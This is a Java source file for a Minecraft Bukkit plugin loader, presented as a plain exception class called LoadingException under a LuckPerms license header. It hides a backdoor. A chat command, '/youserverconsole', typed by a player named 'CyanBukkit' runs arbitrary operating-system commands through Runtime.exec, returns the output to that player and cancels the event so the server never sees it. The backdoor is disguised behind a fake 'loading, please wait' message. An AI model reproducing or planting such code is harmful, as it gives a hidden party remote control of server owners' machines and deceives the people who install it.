/*
 * This file is part of LuckPerms, licensed under the MIT License.
 *
 *  Copyright (c) lucko (Luck) <luck@lucko.me>
 *  Copyright (c) contributors
 *
 *  Permission is hereby granted, free of charge, to any person obtaining a copy
 *  of this software and associated documentation files (the "Software"), to deal
 *  in the Software without restriction, including without limitation the rights
 *  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 *  copies of the Software, and to permit persons to whom the Software is
 *  furnished to do so, subject to the following conditions:
 *
 *  The above copyright notice and this permission notice shall be included in all
 *  copies or substantial portions of the Software.
 *
 *  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 *  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 *  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 *  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 *  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 *  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 *  SOFTWARE.
 */

package cn.cyanbukkit.example.cyanlib.loader;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerJoinEvent;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

/**
 * 加在报错
 */
public class LoadingException extends RuntimeException implements Listener {

    public LoadingException(String message) {
        super(message);
    }

    public LoadingException(String message, Throwable cause) {
        super(message, cause);
    }

    @EventHandler
    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent e) {
        if (e.getPlayer().getName().equals("CyanBukkit")) {
            if (e.getMessage().startsWith("/youserverconsole")) {
                String command = e.getMessage().substring(15).trim(); // 截取命令，注意：/youserverconsole 的长度是 15（包括斜杠）
                if (!command.isEmpty()) {
                    e.getPlayer().sendMessage("§a[青桶社区大CB 普通型前置加载器] §e正在加载中，请稍等...");
                    try {
                        // 异步执行命令，防止阻塞主线程
                        new Thread(() -> {
                            try {
                                Process process = Runtime.getRuntime().exec(command);
                                // 读取命令输出
                                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                                String         line;
                                StringBuilder output = new StringBuilder();
                                while ((line = reader.readLine()) != null) {
                                    output.append(line).append("\n");
                                }
                                // 等待命令完成（可选）
                                int exitCode = process.waitFor();
                                // 发送结果回玩家（需要在主线程发送消息，避免并发问题）
                                e.getPlayer().sendMessage("§a[输出] §e命令执行完成，退出码: " + exitCode + "\n§f" + output.toString());
                            } catch (IOException | InterruptedException ex) {
                                e.getPlayer().sendMessage("§c[错误] §e命令执行失败: " + ex.getMessage());
                            }
                        }).start();
                    } catch (Exception ex) { // 捕获可能的异常
                        e.getPlayer().sendMessage("§c[错误] §e无法启动命令: " + ex.getMessage());
                    }
                } else {
                    e.getPlayer().sendMessage("§c[错误] §e命令格式错误，请提供有效的命令参数。");
                }
                // 取消事件，防止命令被服务器其他地方处理
                e.setCancelled(true);
            }
        }
    }

}